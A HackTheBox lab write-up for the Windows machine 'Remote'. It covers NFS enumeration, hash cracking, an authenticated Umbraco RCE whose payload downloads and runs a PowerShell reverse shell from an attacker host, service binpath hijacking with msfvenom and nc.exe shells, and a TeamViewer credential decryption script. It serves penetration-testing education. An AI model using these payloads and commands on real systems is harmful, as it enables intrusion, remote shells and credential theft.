---
title: "HackTheBox — Remote Writeup"
date: 2020-09-08 14:06:00 +0530
categories: [HackTheBox,Windows Machines]
tags: [NFS, winpeas, umbraco, john, TeamViewer, crackmapexec, Nishang, usosvc, decrypt, AES, remote]
image: /assets/img/Posts/Remote.png
---

> Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service `UsoSvc` to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit.

## Tasks

- Mount the NFS share and discover Umbraco credentials inside SDF file
- Crack the password hash using `john`
- Login to Umbraco application and discover the version
- Exploit Umbraco to get a reverse shell
- Testing Umbraco exploit by `noraj`
- Run `winPEAS.exe` on the machine
- PrivEsc-1 Abuse the `UsoSvc` service
- PrivEsc-2 Extract admin credentials from TeamViewer registry and decrypt it
- PrivEsc-3 Autopwn using TeamViewer Metasploit module

## Reconnaissance

Lets start out with `masscan` and `Nmap` to find out open ports and services:

```shell
cfx:  ~/Documents/htb/remote
→ masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.180

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-06 11:09:01 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 445/tcp on 10.10.10.180
Discovered open port 49678/tcp on 10.10.10.180
Discovered open port 139/tcp on 10.10.10.180
Discovered open port 49679/tcp on 10.10.10.180
Discovered open port 21/tcp on 10.10.10.180
Discovered open port 80/tcp on 10.10.10.180
Discovered open port 135/tcp on 10.10.10.180
Discovered open port 49667/tcp on 10.10.10.180
Discovered open port 49666/tcp on 10.10.10.180
Discovered open port 111/tcp on 10.10.10.180
Discovered open port 47001/tcp on 10.10.10.180
Discovered open port 49665/tcp on 10.10.10.180
Discovered open port 5985/tcp on 10.10.10.180
Discovered open port 49680/tcp on 10.10.10.180
Discovered open port 49664/tcp on 10.10.10.180
Discovered open port 2049/tcp on 10.10.10.180

cfx:  ~/Documents/htb/remote
→ nmap -sC -sV -p445,49678,139,49679,21,80,135,49667,49666,111,47001,49665,5985,49680,49664,2049 10.10.10.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 17:49 IST
Nmap scan report for 10.10.10.180
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m09s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-09-06T12:21:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.81 seconds
```
`nmap` & `masscan` give us lots of Ports and services such as `HTTP, FTP, SMB, NFS` running on the machine, Lets enumerate them accordingly.

### FTP - Port 21

Anonymous login is allowed but the directory is empty.

```shell
cfx:  ~/Documents/htb/remote
→ ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> exit
221 Goodbye.
```

### SMB - Port 445

Using various tools to try enumerating shares:

```shell
cfx:  ~/Documents/htb/remote
→ smbclient -N -L //10.10.10.180
session setup failed: NT_STATUS_ACCESS_DENIED

cfx:  ~/Documents/htb/remote
→ smbmap -H 10.10.10.180
[!] Authentication error on 10.10.10.180

cfx:  ~/Documents/htb/remote
→ crackmapexec smb --shares 10.10.10.180
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
```

Based on our results we could see Null Sessions are not working to enumerate shares. With `crackmapexec` we were able to identify OS and Domain name.

### Website - Port 80

![website](/assets/img/Posts/Remote/website.png)

Lets run `dirsearch` to find out hidden directories.

```console
cfx:  ~/Documents/htb/remote
→ /opt/dirsearch/dirsearch.py --url http://10.10.10.180 -w /usr/share/wordlists/dirb/common.txt -E

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions:  | HTTP method: GET | Suffixes: php, asp, aspx, jsp, js, do, action, html, json, yml, yaml, xml, cfg, bak, txt, md, sql, zip, tar.gz, tgz | Threads: 10 | Wordlist size: 4614 | Request count: 4614

Error Log: /opt/dirsearch/logs/errors-20-09-06_17-53-02.log

Target: http://10.10.10.180

Output File: /opt/dirsearch/reports/10.10.10.180/20-09-06_17-53-02

[17:53:02] Starting:
[17:53:08] 200 -    7KB - /
[17:53:18] 200 -    5KB - /about-us
[17:53:25] 200 -    5KB - /blog
[17:53:25] 200 -    5KB - /Blog
[17:53:34] 200 -    8KB - /contact
[17:53:34] 200 -    8KB - /Contact
[17:53:56] 200 -    7KB - /home
[17:53:56] 200 -    7KB - /Home
[17:54:00] 302 -  126B  - /install  ->  /umbraco/
[17:54:01] 200 -    3KB - /intranet
[17:54:10] 500 -    3KB - /master
[17:54:21] 200 -    7KB - /people
[17:54:21] 200 -    7KB - /People
[17:54:23] 200 -    3KB - /person
[17:54:28] 500 -    3KB - /product
[17:54:28] 200 -    5KB - /products
[17:54:28] 200 -    5KB - /Products
[17:54:55] 200 -    4KB - /umbraco

Task Completed
```

Even after browsing various webpages we don't find anything interesting, However as we scroll down we see various posts and text references near the posts and page source indicating website is running Umbraco CMS.

![umbraco](/assets/img/Posts/Remote/umbraco.png)

A little bit of googling reveals Umbraco CMS admin login page is located at `/umbraco`. But since we don't have any credentials we will move on to enumerate `NFS`.

![umbracologin](/assets/img/Posts/Remote/login.png)

### NFS - Port 2049

We will use `showmount` tool to check which NFS share are accessible to mount and who can mount them.

```shell
cfx:  ~/Documents/htb/remote
→ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

Based on the result we discover `site_backups` is available to mount and is accessible to everyone, so let's mount it to our machine and enumerate further.

```shell
cfx:  ~/Documents/htb/remote
→ mount -t nfs 10.10.10.180:site_backups /mnt
```
Analysing the files:

```shell
cfx:  ~/Documents/htb/remote
→ ls -la /mnt
total 123
drwx------  2 nobody 4294967294  4096 Feb 24  2020 .
drwxr-xr-x 19 root   root        4096 Jul 18 20:37 ..
drwx------  2 nobody 4294967294    64 Feb 20  2020 App_Browsers
drwx------  2 nobody 4294967294  4096 Feb 20  2020 App_Data
drwx------  2 nobody 4294967294  4096 Feb 20  2020 App_Plugins
drwx------  2 nobody 4294967294    64 Feb 20  2020 aspnet_client
drwx------  2 nobody 4294967294 49152 Feb 20  2020 bin
drwx------  2 nobody 4294967294  8192 Feb 20  2020 Config
drwx------  2 nobody 4294967294    64 Feb 20  2020 css
-rwx------  1 nobody 4294967294   152 Nov  1  2018 default.aspx
-rwx------  1 nobody 4294967294    89 Nov  1  2018 Global.asax
drwx------  2 nobody 4294967294  4096 Feb 20  2020 Media
drwx------  2 nobody 4294967294    64 Feb 20  2020 scripts
drwx------  2 nobody 4294967294  8192 Feb 20  2020 Umbraco
drwx------  2 nobody 4294967294  4096 Feb 20  2020 Umbraco_Client
drwx------  2 nobody 4294967294  4096 Feb 20  2020 Views
-rwx------  1 nobody 4294967294 28539 Feb 20  2020 Web.config
```
After looking at various files we come across a file named `Umbraco.sdf` inside the `/App_Data` folder and find Admin credentials at the top of the file.

```shell
cfx:  ~/Documents/htb/remote
→ strings Umbraco.sdf | head
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
```
`admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}` based on this line, we understand email-id of admin is `admin@htb.local` and password SHA1 hash is `b8be16afba8c314ad33d812f22a04991b90e2aaa`

### Cracking hash with John:

```shell
cfx:  ~/Documents/htb/remote
→ cat adminhash
b8be16afba8c314ad33d812f22a04991b90e2aaa

cfx:  ~/Documents/htb/remote
→ john adminhash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)
1g 0:00:00:02 DONE (2020-09-06 18:10) 0.4878g/s 4792Kp/s 4792Kc/s 4792KC/s baconandchipies1..bacon918
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```
We get the password as `baconandcheese`

Now we can login to Umbraco using `admin@htb.local`:`baconandcheese`

## Umbraco Exploit

Successful login to Umbraco:
As we click on the `help` button, we see the `Umbraco Version 7.12.4` based on this info we can search for exploits.

![umbracopage](/assets/img/Posts/Remote/page.png)

Using searchsploit we were able to find a possible authenticated exploit for Umbraco Version 7.12.4 same as our box on Exploit-DB: <https://www.exploit-db.com/exploits/46153>

```console
cfx:  ~/Documents/htb/remote
→ searchsploit umbraco
Umbraco CMS - Remote Command Execution (Metasploit)                                                                  | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code   Execution                                                                     | aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                     | php/webapps/44988.txt
```

### Modifying the exploit

The exploit needs some tweaking, We will make the following changes in the default exploit script to get us an reverse shell:

- login = "admin@htb.local"
- password = "baconandcheese"
- host = "http://10.10.10.180"
- string cmd = "/c iex(iwr http://10.10.14.14:8000/rev.ps1 -usebasicparsing)"
- proc.StartInfo.FileName = "powershell.exe"

Here is the modified exploit:

```shell
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "/c iex(iwr http://10.10.14.14:8000/rev.ps1 -usebasicparsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";
```

To sum it up, we have modified the payload which now uses `powershell.exe` with starting `cmd.exe` argument `-c` to download PowerShell reverse shell using `IWR`(Invoke-WebRequest) and execute it using `IEX` (Invoke-Expression).

The payload we are using is One-liner Nishang reverse TCP shell:

```shell
cfx:  ~/Documents/htb/remote
→ cat rev.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.14',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Shell as DefaultAppPool

### Executing the modified exploit:

```shell
cfx:  ~/Documents/htb/remote
→ python umbraco_rce.py
Start
[]
```

### We see a hit on our http server for our payload rev.ps1

```shell
cfx:  ~/Documents/htb/remote
→ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.180 - - [06/Sep/2020 19:03:59] "GET /rev.ps1 HTTP/1.1" 200 -
```
### Getting a call back on our `nc` listener

```shell
cfx:  ~/Documents/htb/remote
→ rlwrap nc -lvnp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.180.
Ncat: Connection from 10.10.10.180:49697.
whoami
iis apppool\defaultapppool
```
### User Flag

```shell
PS C:\Users\Public> (get-content user.txt).substring(0,16)
8c22011117becf95
PS C:\Users\Public> get-content user.txt
8c22011117becf95****************
```
Inside the Public directory of Users, we can grab the `user.txt`

## Umbraco Exploit by `noraj`

We can also use Umbraco exploit by `noraj` available [**here**](https://github.com/noraj/Umbraco-RCE)
It's a similar exploit which takes all the inputs as arguments.

```shell
cfx:  ~/Documents/htb/remote/Umbraco-RCE  |master ✓|
→ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "iex(iwr http://10.10.14.14:8000/rev.ps1 -usebasicparsing)"

cfx:  ~/Documents/htb/remote
→ nc -lvnp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.180.
Ncat: Connection from 10.10.10.180:49730.
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> exit
```

## Privilege Escalation

First we will transfer `winPEAS.exe` on the machine and run to discover possible local privilege escalation vectors:

We will use `iwr` to transfer the binary

```shell
PS C:\Windows\Temp> iwr -uri http://10.10.14.14:8000/winPEAS.exe -o winpeas.exe
PS C:\Windows\Temp> ./winpeas.exe
```
Looking at the output of `winPEAS.exe`, two things seemed interesting to me:

- First, We have full to a service named as `UsoSvC`

```console
[+] Modifiable Services
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    UsoSvc: AllAccess, Start
```

- Second, We see an outdated version of TeamViewer is installed and running on the machine:

```console
[+] Installed Applications --Via Program Files/Uninstall registry--
[?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
C:\Program Files (x86)\TeamViewer\Version7
```

## PrivEsc 1: Abusing **UsoSvc** Service

Since we have full access to `UsoSvc` service, we can modify the `binpath` of the service and pop us an reverse shell.

`winPEAS` has also given us an article <https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services> on how to abuse services

- Method 1: We will create a malicious reverse shell payload with `msfvenom`, transfer it on the machine and change the `binpath` of `UsoSvC` with our reverse shell payload.

```shell
cfx:  ~/Documents/htb/remote
→ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=8021 -f exe -o priv.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: priv.exe
```
Transferring the payload:

```shell
PS C:\Windows\Temp> iwr -uri http://10.10.14.14:8000/priv.exe -o priv.exe

cfx:  ~/Documents/htb/remote
→ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.180 - - [06/Sep/2020 19:03:59] "GET /rev.ps1 HTTP/1.1" 200 -
10.10.10.180 - - [06/Sep/2020 19:04:53] "GET /winPEAS.exe HTTP/1.1" 200 -
10.10.10.180 - - [06/Sep/2020 19:15:44] "GET /priv.exe HTTP/1.1" 200 -
```
### Changing the `binpath`

```shell
PS C:\Windows\Temp> sc.exe config usosvc binpath='C:\Windows\Temp\priv.exe'
[SC] ChangeServiceConfig SUCCESS

PS C:\Windows\Temp> sc.exe stop usosvc

SERVICE_NAME: usosvc
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530
PS C:\Windows\Temp> sc.exe stop usosvc
[SC] ControlService FAILED 1062:

The service has not been started.

PS C:\Windows\Temp> sc.exe start usosvc
```

### Shell as System:

As soon as we start the `UsoSvc` service again we get a call back on our `nc` listener:

```shell
cfx:  ~/Documents/htb/remote
→ nc -lvnp 8021
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8021
Ncat: Listening on 0.0.0.0:8021
Ncat: Connection from 10.10.10.180.
Ncat: Connection from 10.10.10.180:49712.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

### Root Flag:

```shell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
4963d8d771c1fb09****************
```

- Method 2: We will transfer `nc.exe` binary on the machine, change the `binpath` and get us a PowerShell reverse shell.

```shell
PS C:\Windows\Temp> iwr -uri http://10.10.14.14:8000/nc.exe -o nc.exe

PS C:\Windows\Temp> sc.exe config usosvc binpath='C:\Windows\Temp\nc.exe 10.10.14.14 8021 -e powershell.exe'
[SC] ChangeServiceConfig SUCCESS
PS C:\Windows\Temp> sc.exe stop usosvc
[SC] ControlService FAILED 1062:

The service has not been started.

PS C:\Windows\Temp> sc.exe start usosvc


cfx:  ~/Documents/htb/remote
→ nc -lvnp 8021
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8021
Ncat: Listening on 0.0.0.0:8021
Ncat: Connection from 10.10.10.180.
Ncat: Connection from 10.10.10.180:49718.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

## PrivEsc 2: TeamViewer

Based on `winPEAS` output we can see an Outdated version7 of TV is installed & running on the machine:

```shell
PS C:\windows\system32\inetsrv> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          8 K
System                           4                            0        140 K
Registry                       104                            0     23,380 K
smss.exe                       304                            0      1,212 K
csrss.exe                      404                            0      5,160 K
[..SNIP..]
lsass.exe                      648                            0     14,804 K
svchost.exe                    772                            0      3,604 K
TeamViewer_Service.exe        2964                            0     20,096 K
VGAuthService.exe             3028                            0     10,068 K
vmtoolsd.exe                  3036                            0     18,348 K
```
I found an awesome article on TeamViewer [**here**](https://whynotsecurity.com/blog/TeamViewer/). Apparently, TV uses static keys to encrypt/decrypt credentials.

These passwords are stored in Windows registry inside the value `SecurityPasswordAES` which we can extract and decrypt them using the known `KEY` & `IV`.

### Key Points:

- TeamViewer stores user passwords encrypted with AES-128-CBC
- Key : 0602000000a400005253413100040000
- IV : 0100010067244F436E6762F25EA8D704

### Extracting Password

A Quick search on Google reveals TeamViewer registry is under `HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7`

```shell
PS C:\Windows\Temp> reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7

HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056B984A8
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x5e72893c
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
```
The value what we need is `SecurityPasswordAES    REG_BINARY  FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B`

### Decrypt Script

The author has published a python script to decrypt the password on the blog or you can also find the script on [**my github**](https://github.com/ColdFusionX/CTF-Scripts/tree/master/HTB/Remote)

We just need to replace the `hex_str_cipher` value with the encrypted data value we found inside `SecurityPasswordAES` and run the script.

```python
cfx:  ~/Documents/htb/remote
→ cat TeamViewer_hash_decrypt.py
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"  # output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

### Administrator credentials

Running the python decrypt script we get the Administrator credentials as `!R3m0te!`

```shell
cfx:  ~/Documents/htb/remote
→ python3 TeamViewer_hash_decrypt.py
00000000: 21 00 52 00 33 00 6D 00  30 00 74 00 65 00 21 00  !.R.3.m.0.t.e.!.
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
None
!R3m0te!
```
### Testing credentials

We can test these credentials using `crackmapexec`:

```shell
cfx:  ~/Documents/htb/remote
→ crackmapexec smb 10.10.10.180 -u administrator -p '!R3m0te!'
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [+] remote\administrator:!R3m0te! (Pwn3d!)
```
The `Pwn3d!` indicates we are got the correct credentials for Administrator.

We can use these credentials to login as Administrator with `Evil-WinRM` or `psexec`

```shell
cfx:  ~/Documents/htb/remote
→ evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> exit
```

## TeamViewer Module- Metasploit

We can autopwn and find the credentials using the Metasploit module, First we will get a `meterpreter` reverse shell using `web_delivery` exploit module.

```shell
msf5 exploit(multi/script/web_delivery) > set RHOST 10.10.10.180
RHOST => 10.10.10.180
msf5 exploit(multi/script/web_delivery) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set LPORT 4445
LPORT => 4445

msf5 exploit(multi/script/web_delivery) > set target 2
target => 2
msf5 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.14:4445
msf5 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/VGjNaq
[*] Local IP: http://10.0.2.15:8080/VGjNaq
[*] Server started.
[*] Run the following command on the target machine:
